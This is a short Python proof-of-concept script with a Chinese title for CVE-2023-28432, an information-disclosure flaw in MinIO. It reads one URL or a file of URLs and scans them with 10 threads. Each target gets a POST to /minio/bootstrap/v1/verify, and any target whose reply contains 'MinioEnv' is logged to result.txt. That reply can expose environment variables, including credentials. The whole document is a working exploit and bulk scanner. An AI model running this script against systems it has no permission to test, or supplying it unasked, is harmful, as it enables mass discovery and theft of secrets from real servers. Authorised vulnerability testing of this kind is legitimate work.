# CVE-2023-28432 MiniO信息泄露漏洞复现
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="CVE-2023-28432 MiniO信息泄露漏洞复现")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(10)  
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/minio/bootstrap/v1/verify'
    url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.post(url=url, headers=headers, verify=False, timeout=10,proxies=proxies)
        if response.status_code == 200 and 'MinioEnv' in response.text:
            print(f"[+] 该网址存在MiniO信息泄露漏洞: {target}")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
        else:
            print(f"[-] 该网址不存在MiniO信息泄露漏洞: {target}")
    except Exception:
        print(f"[*] 无法访问目标网址: {target}")

if __name__ == '__main__':
    main()